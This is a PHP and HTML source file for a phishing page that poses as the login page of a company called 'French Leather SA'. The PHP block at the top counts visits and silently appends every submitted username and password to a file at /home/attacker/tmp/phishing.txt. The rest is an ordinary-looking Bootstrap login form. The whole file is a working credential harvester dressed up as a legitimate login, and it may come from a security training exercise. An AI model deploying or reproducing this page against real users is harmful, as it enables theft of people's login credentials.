<?php
	$handle = fopen("/home/attacker/tmp/counter.txt", "r");
	$counter = 0;
	if ($handle) {
		$counter = (int) fread($handle, 20);
		fclose ($handle);
	}
	$counter++;
	$handle = fopen("/home/attacker/tmp/counter.txt", "w");
	fwrite($handle, $counter.PHP_EOL);
	fclose ($handle);

	if (isset($_POST['username']) && isset($_POST['password'])) {
		$txt = $_POST['username'] . ":" . $_POST['password'];
		$myfile = file_put_contents('/home/attacker/tmp/phishing.txt', $txt.PHP_EOL, FILE_APPEND | LOCK_EX);
	}
?>

<!DOCTYPE html>
<html>
	<head>
		<title>French Leather SA</title>
		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1">

		<link href="bootstrap-5.0.2-dist/css/bootstrap.min.css" rel="stylesheet">
		<script src="bootstrap-5.0.2-dist/js/bootstrap.bundle.min.js"></script>
   		<link rel="stylesheet" type="text/css" href="css/stylesheet.css">
	</head>
	<body>
		<div class="container">
			<div class="header clearfix">
				<nav>
					<ul class="nav justify-content-end">
						<li class="nav-link" role="presentation" ><a href="index.php">Home</a></li>
						<li class="nav-link" role="presentation"><a href="login.php">Login</a></li>
						<li class="nav-link" role="presentation"><a href="register.php">Register</a></li>
						<li class="nav-link" role="presentation"><a href="about.php">About</a></li>
						<li class="nav-link" role="presentation"><a href="joinus.php">Join us</a></li>
					</ul>
				</nav>
				<a href="index.php"><img src="img/logo.jpg" height="70px"></a>
				<h3 class="text-muted">French Leather SA</h3>
			</div>

		<div class="jumbotron">
			<h2>Login</h2>
			<form action="login.php" method="post">
				<div class="form-group">
					<label>Username</label>
					<input type="text" name="username" class="form-control" value="">
					<span class="help-block"></span>
				</div>
				<div class="form-group">
					<label>Password</label>
					<input type="password" name="password" class="form-control">
					<span class="help-block"></span>
				</div>
				<div class="form-group">
					<input type="submit" class="btn btn-primary" value="Login">
				</div>
				<p>Don't have an account? <a href="register.php">Sign up now</a>.</p>
			</form>
		</div>
	</body>
</html>
